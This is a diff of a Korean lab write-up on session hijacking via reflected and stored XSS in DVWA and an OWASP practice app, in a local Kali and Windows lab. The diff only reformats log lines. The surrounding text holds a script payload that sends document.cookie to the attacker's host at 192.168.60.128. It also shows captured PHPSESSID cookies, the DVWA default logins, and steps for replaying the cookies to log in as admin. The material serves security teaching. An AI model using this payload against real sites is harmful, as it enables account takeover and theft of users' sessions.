@@ -13,9 +13,9 @@
 <script>document.location='http://192.168.60.128/cookie?'+document.cookie</script>
 ```
 3. 윈도우에서 `404 Not Found` 가 보임과 동시에 칼리에서는 쿠키 정보로써 세션을 탈취한 아래 내용이 보임
-``` bash
-192.168.60.1 - - [09/Apr/2021:17:18:51 +0900] "GET /cookie?security=low;%20PHPSESSID=48b916e85b42330e04852ff049d5f064 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-```
+
+`192.168.60.1 - - [09/Apr/2021:17:18:51 +0900] "GET /cookie?security=low;%20PHPSESSID=48b916e85b42330e04852ff049d5f064 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"`
+
 4. 칼리에서 DVWA에 `pablo:letmein` 또는 `smithy:password` 로 로그인
 5. Cookie Editor 에서 `PHPSESSID` 를 로그 파일의 내용으로 변경
 6. 새로고침 하면 왼쪽 아래에 Username 이 admin 으로 된 것을 볼 수 있음
@@ -44,9 +44,9 @@ $dbname = 'owasp10';
 1. 칼리에서 `tail -f /var/log/nginx/access.log` 로 로그 모니터링
 2. 윈도우에서 `test:test` 회원가입 후 로그인
 3. `OWASP Top 10` > `A2 (XSS)` > `Reflected` > `DNS Lookup` 에서 아까와 같은 스크립트를 실행하면 아래와 비슷한 로그 확인
-``` bash
-192.168.60.1 - - [09/Apr/2021:18:07:39 +0900] "GET /cookie?username=test;%20uid=17;%20PHPSESSID=2aae495d56711c667e53e602925e5876 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"
-```
+
+`192.168.60.1 - - [09/Apr/2021:18:07:39 +0900] "GET /cookie?username=test;%20uid=17;%20PHPSESSID=2aae495d56711c667e53e602925e5876 HTTP/1.1" 404 188 "http://192.168.60.129/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36"`
+
 4. 쿠키 값으로 `username` / `uid` / `PHPSESSID` 가 보이는데 이것을 칼리 Cookie Editor 로 전부 입력 후 새로고침
 5. 왼쪽 상단에 `Logged In User` 가 `test` 인것을 확인할 수 있음
 
